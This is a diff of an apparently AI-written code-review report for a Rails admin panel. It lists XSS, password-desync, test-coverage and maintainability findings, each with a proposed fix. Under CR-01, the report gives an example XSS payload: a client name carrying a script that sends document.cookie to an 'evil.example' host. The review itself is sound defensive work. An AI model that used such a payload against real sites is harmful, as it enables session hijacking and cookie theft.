@@ -1,6 +1,6 @@
 ---
 phase: 06-admin-feedback-panel
-reviewed: 2026-05-27T04:00:00Z
+reviewed: 2026-05-27T12:00:00Z
 depth: standard
 files_reviewed: 11
 files_reviewed_list:
@@ -16,152 +16,88 @@ files_reviewed_list:
   - test/controllers/admin/clients_controller_test.rb
   - test/controllers/admin/dashboard_controller_test.rb
 findings:
-  critical: 3
-  warning: 4
-  info: 2
-  total: 9
+  critical: 2
+  warning: 2
+  info: 4
+  total: 8
 status: issues_found
 ---
 
 # Phase 06: Code Review Report
 
-**Reviewed:** 2026-05-27T04:00:00Z
+**Reviewed:** 2026-05-27
 **Depth:** standard
 **Files Reviewed:** 11
 **Status:** issues_found
 
 ## Summary
 
-This phase introduced the `admin_reply` field (migration + permitting + UI form), the `mark_revised` action, approval-history on the client show page, and a filterable dashboard. Cross-referencing the view conditions, controller guards, and test coverage reveals three blockers: an XSS vector via `raw()` in the confirm modal, a functional break where the admin-reply form is shown for `change_requested` artes but the `update` action rejects them, and a crash path in the dashboard filter when an arbitrary string is passed as `?status=`. Two additional warnings cover a password-plain staleness bug on update and an unreachable-UI test. Two info items cover dead instance variables and a test class naming inconsistency.
+Reviewed the admin feedback panel phase including the gap closure changes from plan 06-04: `check_editable` now correctly accepts `change_requested?`, the dashboard controller now whitelists the `status` param via `Arte.statuses.keys.include?`, and the test suite was extended for the `mark_revised` workflow.
+
+The two gap closure changes are implemented correctly. Two critical issues were found in adjacent code that ships in the same diff: a stored XSS vector in the client show modals and a password desync path in the clients controller `update` action. Two warnings flag missing test coverage for the gap closure changes themselves. Four info items cover maintainability concerns.
 
 ---
 
 ## Critical Issues
 
-### CR-01: XSS via `raw(body)` in `_confirm_modal` with unescaped `@client.name`
+### CR-01: Stored XSS — `raw(body)` renders unescaped `@client.name` in confirm modals
 
-**File:** `app/views/admin/clients/show.html.erb:25` and `:104`
+**File:** `app/views/admin/clients/show.html.erb:25` and `app/views/admin/clients/show.html.erb:104`
 
-**Issue:** Both `confirm_modal` invocations build the `body:` string with plain Ruby string interpolation of `@client.name`:
-
-```erb
-body: "Desativar <strong>#{@client.name}</strong> bloqueará o acesso..."
-body: "...link atual de <strong>#{@client.name}</strong> para de funcionar..."
-```
-
-The partial `_confirm_modal.html.erb:34` renders that string with `raw(body)`, bypassing Rails' automatic HTML escaping. The `Client` model validates `name` for presence only — no format restriction or sanitization. If an admin creates a client with a name containing HTML, e.g. `</strong><script>alert(document.cookie)</script><strong>`, the script executes for any admin who opens the deactivate or rotate-token modal.
-
-**Fix:** Use `html_escape` (alias `h`) when interpolating user data into the body string, then keep `raw()` in the partial to allow the intended static HTML tags:
+**Issue:** Both `confirm_modal` render calls build the `body:` argument using plain Ruby string interpolation of `@client.name`:
 
 ```erb
-body: "Desativar <strong>#{h(@client.name)}</strong> bloqueará o acesso..."
-body: "...link atual de <strong>#{h(@client.name)}</strong> para de funcionar..."
+body: "Desativar <strong>#{@client.name}</strong> bloqueará o acesso ao portal imediatamente."
+body: "...link atual de <strong>#{@client.name}</strong> para de funcionar imediatamente..."
 ```
 
-Alternatively, pass `name` as a separate local and escape it inside the partial where it is rendered.
+The `_confirm_modal` partial renders that value with `raw(body)` (partial line 34), bypassing Rails auto-escaping. The `Client` model enforces only presence on `name` — no format restriction or sanitisation. A client name such as `</strong><script>fetch('https://evil.example/steal?c='+document.cookie)</script><strong>` is stored in the database and executed as JavaScript for any admin who opens either modal. Since the admin panel holds session cookies and token-management actions, this is a session-hijack or token-exfiltration vector.
+
+**Fix:** Escape the interpolated name with `h()` before it enters the raw-rendered string:
+
+```erb
+body: "Desativar <strong>#{h(@client.name)}</strong> bloqueará o acesso ao portal imediatamente. O cliente não conseguirá acessar o calendário até ser reativado.".html_safe,
+```
+
+```erb
+body: ("&#9888; <strong>Atenção</strong><br><br>Ao rotacionar o token, o link atual de " \
+       "<strong>#{h(@client.name)}</strong> para de funcionar imediatamente e qualquer sessão " \
+       "aberta do cliente é encerrada.<br><br>Você precisará enviar o novo link para o cliente.").html_safe,
+```
+
+Alternatively, pass `client_name` as a separate local to the partial and escape it there, keeping the partial free of raw user data.
 
 ---
 
-### CR-02: Admin-reply form shown for `change_requested` arte, but `update` action blocks save
+### CR-02: `password_plain` directly writable via HTTP, can desync from `password_digest`
 
-**File:** `app/views/admin/artes/show.html.erb:30` and `app/controllers/admin/artes_controller.rb:71`
+**File:** `app/controllers/admin/clients_controller.rb:65` and `app/controllers/admin/clients_controller.rb:38`
 
-**Issue:** The admin-reply form is rendered whenever the arte is `change_requested` **or** `revised`:
-
-```erb
-<% if @arte.change_requested? || @arte.revised? %>
-  <%= form_with model: [:admin, @arte], method: :patch do |f| %>
-    <%= f.text_area :admin_reply ... %>
-    ...
-  <% end %>
-<% end %>
-```
-
-But `check_editable` — which runs before `update` — only allows the action to proceed when the arte is `pending` **or** `revised`:
+**Issue:** `client_params` permits `:password_plain` as an independent field from the browser:
 
 ```ruby
-def check_editable
-  unless @arte.pending? || @arte.revised?
-    redirect_to admin_arte_path(@arte), alert: "Edição bloqueada: ..."
-  end
+params.require(:client).permit(:name, :password, :password_plain, :active)
+```
+
+The `update` filter (line 38) only suppresses *blank* values:
+
+```ruby
+filtered = client_params.reject { |k, v| ["password", "password_plain"].include?(k) && v.blank? }
+```
+
+A request with `password=""` and `password_plain="attacker_value"` causes `password` to be rejected (blank) while `password_plain="attacker_value"` is kept and persisted. The call to `@client.update(filtered)` then saves `password_plain="attacker_value"` without touching `password_digest`. After this, the plaintext value stored in the database and displayed to the admin on the show page is wrong — it no longer matches the bcrypt digest that governs actual client login. The client's real password is unchanged but the admin UI shows a different value, leading to support failures and broken portal links sent to clients.
+
+**Fix:** Remove `:password_plain` from the permitted params list. Derive it exclusively from the `password` field in the controller, not from user input:
+
+```ruby
+def client_params
+  params.require(:client).permit(:name, :password, :active)
 end
-```
 
-Consequence: the primary use-case for `admin_reply` (responding to a client's `change_requested` arte) is fully blocked. The admin sees the form, submits it, and receives "Edição bloqueada" instead of a saved reply. The reply is silently discarded. The feature does not work.
-
-**Fix:** Add `change_requested?` to the `check_editable` guard, or introduce a dedicated `update_reply` action that is not gated by `check_editable`:
-
-Option A — extend the guard (simplest):
-```ruby
-def check_editable
-  unless @arte.pending? || @arte.revised? || @arte.change_requested?
-    redirect_to admin_arte_path(@arte), alert: "Edição bloqueada: ..."
-  end
-end
-```
-
-Option B — dedicated route + action (cleanest, avoids exposing full `arte_params` for `change_requested`):
-```ruby
-# routes.rb: add member route :patch :update_reply
-def update_reply
-  if @arte.change_requested? || @arte.revised?
-    @arte.update!(admin_reply: params.dig(:arte, :admin_reply))
-    redirect_to admin_arte_path(@arte), notice: "Resposta salva."
-  else
-    redirect_to admin_arte_path(@arte), alert: "Ação inválida."
-  end
-end
-```
-
----
-
-### CR-03: Dashboard status filter crashes with `ArgumentError` on arbitrary input
-
-**File:** `app/controllers/admin/dashboard_controller.rb:8`
-
-**Issue:**
-
-```ruby
-scope = scope.where(status: params[:status]) if params[:status].present?
-```
-
-In Rails 7+ (this project uses Rails 8.1), passing an unrecognised string to `where(status:)` on an enum column raises `ArgumentError: 'xyz' is not a valid status`. This is an unhandled exception that results in a 500 response. Any user — or an automated probe — can crash the dashboard by requesting `GET /admin?status=anything`.
-
-**Fix:** Whitelist the value before passing it to the query:
-
-```ruby
-allowed_statuses = Arte.statuses.keys  # ["pending", "approved", "change_requested", "revised"]
-if params[:status].present? && allowed_statuses.include?(params[:status])
-  scope = scope.where(status: params[:status])
-end
-```
-
----
-
-## Warnings
-
-### WR-01: `password_plain` becomes stale when admin updates password via edit form
-
-**File:** `app/controllers/admin/clients_controller.rb:36-39`
-
-**Issue:** The `create` action correctly syncs `password_plain` from the submitted `password`:
-
-```ruby
-params_with_plain = params_with_plain.merge(password_plain: params_with_plain[:password])
-```
-
-But the `update` action does not perform this sync. The edit form (`_form.html.erb`) has only a `password` field, not `password_plain`. When an admin submits a new password, `filtered` contains `password: "newpwd"` (not blank → kept) and omits `password_plain` entirely (it is blank and excluded by the reject block). The model's `update` call updates `password_digest` via `has_secure_password`, but `password_plain` in the database retains the previous value. The client show page then displays the **old** password as the portal password, which is wrong.
-
-**Fix:** Mirror the `create` sync in `update`:
-
-```ruby
 def update
   was_active = @client.active
-  filtered = client_params.reject { |k, v| ["password", "password_plain"].include?(k) && v.blank? }
-  # Keep password_plain in sync with password when password is being changed
-  if filtered[:password].present?
-    filtered = filtered.merge(password_plain: filtered[:password])
-  end
+  filtered = client_params.reject { |k, v| k == "password" && v.blank? }
+  filtered = filtered.merge(password_plain: filtered[:password]) if filtered[:password].present?
   if @client.update(filtered)
     ...
   end
@@ -170,110 +106,148 @@ end
 
 ---
 
-### WR-02: `update_admin_reply` test verifies an unreachable UI state
+## Warnings
 
-**File:** `test/controllers/admin/artes_controller_test.rb:90-94`
+### WR-01: No direct positive test for `check_editable` allowing `change_requested` and `revised`
 
-**Issue:**
+**File:** `test/controllers/admin/artes_controller_test.rb:33`
+
+**Issue:** The gap closure adds `change_requested?` (and retains `revised?`) to the `check_editable` guard. The existing negative test (line 33) only verifies that `:approved` is blocked. There is no test asserting that a `GET edit_admin_arte_url` succeeds for `:change_requested` or `:revised`.
+
+The `update_admin_reply` test (line 90) partially covers `check_editable` for `change_requested` via PATCH, but it tests `admin_reply` persistence as a side-effect, not the guard itself. There is no coverage at all for `revised?` being allowed through `check_editable`. A regression that accidentally removes either status from the guard would not be caught.
+
+**Fix:** Add two explicit tests:
 
 ```ruby
-test "update_admin_reply persiste campo" do
-  patch admin_arte_url(@arte), params: { arte: { admin_reply: "Nota interna do admin" } }
-  ...
+test "should allow edit for change_requested arte" do
+  @arte.update!(status: :change_requested)
+  get edit_admin_arte_url(@arte)
+  assert_response :success
+end
+
+test "should allow edit for revised arte" do
+  @arte.update!(status: :revised)
+  get edit_admin_arte_url(@arte)
+  assert_response :success
 end
 ```
 
-`@arte` has `status: :pending`. `check_editable` passes because `pending?` is true. However, the admin-reply form in `show.html.erb` is **never rendered** for pending artes (the guard is `change_requested? || revised?`). The test therefore exercises a PATCH request that cannot be triggered through the UI. More critically, it masks the actual blocker (CR-02): a test for the real use-case (`change_requested` arte) would fail, revealing the bug. This test gives false confidence that `admin_reply` works.
-
-**Fix:** Change the test to use `status: :change_requested` and assert that the save succeeds (after CR-02 is resolved). Also add a test for `status: :revised` to confirm that path works. Remove or rename the `pending` variant if it has no value.
-
 ---
 
-### WR-03: `@artes_with_responses` N+1 risk masked by misleading `distinct` + `joins`
+### WR-02: Dashboard status filter not tested with invalid or missing values
 
-**File:** `app/controllers/admin/clients_controller.rb:9-13`
+**File:** `test/controllers/admin/dashboard_controller_test.rb:31`
 
-**Issue:**
+**Issue:** The whitelist guard in `dashboard_controller.rb` line 8 correctly prevents an `ArgumentError` from ActiveRecord when an unknown enum value reaches `where(status:)`. However, the test suite only covers the happy path (`status: "pending"`). There is no test verifying that an unknown value (e.g., `"nonexistent"`, an empty array, a SQL fragment) is silently discarded and a full unfiltered result is returned without a 500 error.
 
-```ruby
-@artes_with_responses = @client.artes
-                                .joins(:approval_responses)
-                                .includes(:approval_responses)
-                                .distinct
-                                .order(scheduled_on: :desc)
-```
-
-`joins` and `includes` on the same association in Rails can interact unpredictably: depending on Rails version and query shape, Active Record may issue a separate `SELECT approval_responses.*` query for the preload phase rather than using the join's result set. The `distinct` is necessary to undo the duplication from `joins`, but the combination is fragile. If the association preload is not working as expected, each iteration of `@artes_with_responses.each` that calls `arte.approval_responses` will trigger a new query.
-
-**Fix:** Replace the `joins` + `includes` + `distinct` combination with a subquery filter using `where`:
+**Fix:**
 
 ```ruby
-@artes_with_responses = @client.artes
-                                .where(id: ApprovalResponse.select(:arte_id))
-                                .includes(:approval_responses)
-                                .order(scheduled_on: :desc)
+test "filter by invalid status is ignored and returns all artes" do
+  get admin_root_url, params: { status: "nonexistent_status" }
+  assert_response :success
+  assert_includes response.body, @arte.title
+end
 ```
-
-This guarantees a clean preload without the joins-induced row duplication.
-
----
-
-### WR-04: Dead instance variables in `artes_controller#index`
-
-**File:** `app/controllers/admin/artes_controller.rb:10-12`
-
-**Issue:**
-
-```ruby
-@status_options = Arte.statuses.keys
-@platform_options = Arte.platforms.keys
-# Filtering logic can be added here
-```
-
-These two instance variables are not referenced in any view (confirmed by searching `app/views/admin/artes/index.html.erb`). They incur unnecessary database-layer calls and mislead future maintainers into thinking filtering UI exists for the artes index.
-
-**Fix:** Remove both lines until filtering is implemented, or add the corresponding view UI. Do not keep commented-out roadmap notes in controller code.
 
 ---
 
 ## Info
 
-### IN-01: Test class for `Admin::ClientsController` missing namespace
+### IN-01: Variable name `response` shadows `ActionDispatch::TestResponse` in integration test
 
-**File:** `test/controllers/admin/clients_controller_test.rb:3`
+**File:** `test/controllers/admin/artes_controller_test.rb:84`
 
-**Issue:**
+**Issue:** In `ActionDispatch::IntegrationTest`, `response` is a built-in method returning the last HTTP response object. Line 84 assigns an `ApprovalResponse` model instance to a local named `response`:
 
 ```ruby
-class AdminClientsControllerTest < ActionDispatch::IntegrationTest
+response = @arte.approval_responses.build(decision: :approved)
+assert response.valid?, ...
+response.save!
 ```
 
-All other admin controller tests follow the convention `Admin::XxxControllerTest`. This one is `AdminClientsControllerTest` (no namespace). Rails integration tests route via path helpers so this does not break test execution, but it breaks the naming convention used throughout the suite, makes the test harder to locate by class name, and can cause confusion when using test runner output or grep.
+The shadow is benign in this exact test because no HTTP assertions follow it. However, any future assertion added after line 84 that uses `response.body` or `assert_response` would silently evaluate against the model object, producing confusing failures.
 
-**Fix:**
+**Fix:** Rename the local variable:
 
 ```ruby
-class Admin::ClientsControllerTest < ActionDispatch::IntegrationTest
+approval = @arte.approval_responses.build(decision: :approved)
+assert approval.valid?, "ApprovalResponse deve ser válida para arte com status revised"
+approval.save!
+assert @arte.reload.approved?, "Arte deve ficar approved após aprovação pelo cliente"
 ```
 
 ---
 
-### IN-02: Dashboard filter does not validate `client_id` existence before querying
+### IN-02: "Editar" button hidden for `revised?` and `change_requested?` artes in show view
 
-**File:** `app/controllers/admin/dashboard_controller.rb:7`
+**File:** `app/views/admin/artes/show.html.erb:17`
 
-**Issue:**
+**Issue:** The "Editar" link is conditionally shown only for `pending?`:
 
-```ruby
-scope = scope.where(client_id: params[:client_id]) if params[:client_id].present?
+```erb
+<%= link_to "Editar", edit_admin_arte_path(@arte), class: "btn btn-secondary" if @arte.pending? %>
 ```
 
-If `params[:client_id]` is a non-existent ID, the query silently returns an empty result set — no error, no feedback. This is functionally acceptable but can confuse an admin who accidentally pastes a stale ID. Unlike `status` (CR-03), this does not crash, so it is info-level.
+After the gap closure, `check_editable` permits editing for `pending?`, `revised?`, and `change_requested?`. For the latter two states, the full edit form is accessible via direct URL but there is no button in the UI. An admin who needs to correct the title or media attachment of a `change_requested` arte must know to manually navigate to the edit URL.
 
-**Fix:** Optionally validate that `params[:client_id]` matches a known client ID, or simply accept that an empty result set is self-explanatory for the admin audience.
+**Fix:** Expand the condition to match `check_editable`:
+
+```erb
+<%= link_to "Editar", edit_admin_arte_path(@arte), class: "btn btn-secondary" \
+      if @arte.pending? || @arte.revised? || @arte.change_requested? %>
+```
 
 ---
 
-_Reviewed: 2026-05-27T04:00:00Z_
+### IN-03: Redundant `value:` override on `f.text_area :admin_reply`
+
+**File:** `app/views/admin/artes/show.html.erb:35`
+
+**Issue:** The form builder field `f.text_area :admin_reply` automatically binds the textarea's content from `@arte.admin_reply`. The explicit `value: @arte.admin_reply` option is redundant and creates a double-binding that must be updated in two places if the attribute name ever changes:
+
+```erb
+<%= f.text_area :admin_reply,
+                value: @arte.admin_reply,   # redundant
+                rows: 4, ...
+```
+
+**Fix:** Remove the explicit `value:` option:
+
+```erb
+<%= f.text_area :admin_reply,
+                rows: 4,
+                placeholder: "Escreva uma nota interna sobre o pedido de alteração do cliente...",
+                class: "..." %>
+```
+
+---
+
+### IN-04: `status_labels` hardcoded in dashboard view — silently shows `nil` for future statuses
+
+**File:** `app/views/admin/dashboard/index.html.erb:13`
+
+**Issue:** The display label mapping is a static hash in the view. If a new status is added to the `Arte` enum without updating this hash, `Arte.statuses.keys.map { |s| [status_labels[s], s] }` yields `[nil, "new_status"]`, rendering a blank option label in the filter select.
+
+```ruby
+status_labels = {
+  "pending"          => "Pendente",
+  "approved"         => "Aprovado",
+  "change_requested" => "Pediu Alteração",
+  "revised"          => "Revisado"
+}
+```
+
+**Fix:** Use `fetch` with a humanised fallback so unknown statuses degrade gracefully rather than silently:
+
+```ruby
+status_options = [["Todos os status", ""]] + Arte.statuses.keys.map { |s|
+  [status_labels.fetch(s, s.humanize), s]
+}
+```
+
+---
+
+_Reviewed: 2026-05-27_
 _Reviewer: Claude (gsd-code-reviewer)_
 _Depth: standard_
